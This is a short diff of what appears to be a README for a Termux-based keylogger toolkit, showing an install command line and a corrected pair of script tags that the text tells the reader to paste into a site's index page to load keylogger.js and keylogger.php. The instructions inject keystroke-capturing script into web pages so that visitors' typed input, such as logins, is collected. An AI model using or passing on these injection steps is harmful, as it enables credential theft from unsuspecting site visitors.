@@ -176,8 +176,8 @@ pkg install git python php curl openssh grep && pip3 install wget && git clone h
 -- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
 
 ```
-<script src="keylogger.js">
-<script src="keylogger.php">
+<script src="keylogger.js"></script>
+<script src="keylogger.php"></script>
 
 ```
 
